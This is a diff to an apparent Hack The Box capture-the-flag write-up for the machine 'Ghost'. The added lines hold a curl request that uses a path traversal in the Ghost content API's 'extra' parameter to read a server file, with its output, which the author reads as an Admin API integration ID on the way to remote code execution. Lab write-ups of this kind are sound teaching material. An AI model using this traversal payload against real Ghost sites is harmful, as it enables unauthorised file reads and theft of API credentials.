@@ -505,8 +505,13 @@ curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc
 As seen here, at the bottom of the output i can read files, which means i should be able to dump the `DEV_INTRANET_KEY` to then get RCE
 
 ```python
+curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../var/lib/ghost/extra/important' 
 
+...[SNIP]...
+
+"extra":{"../../../../var/lib/ghost/extra/important":"659cdeec9cd6330001baefbf\n"}}}  
 ```
 
-> That value is a 24-character hex string — exactly the length/format of a **Ghost Admin API integration ID** (Ghost's Admin API keys are formatted as `id:secret`, where `id` is a 24-char hex Mongo-style ObjectId and `secret` is a 64-char hex HMAC key)
+> This value is a 24-character hex string — exactly the length/format of a **Ghost Admin API integration ID** (Ghost's Admin API keys are formatted as `id:secret`, where `id` is a 24-char hex Mongo-style ObjectId and `secret` is a 64-char hex HMAC key)
 
+So i have the ID now i need to get the secret part, i can use bot
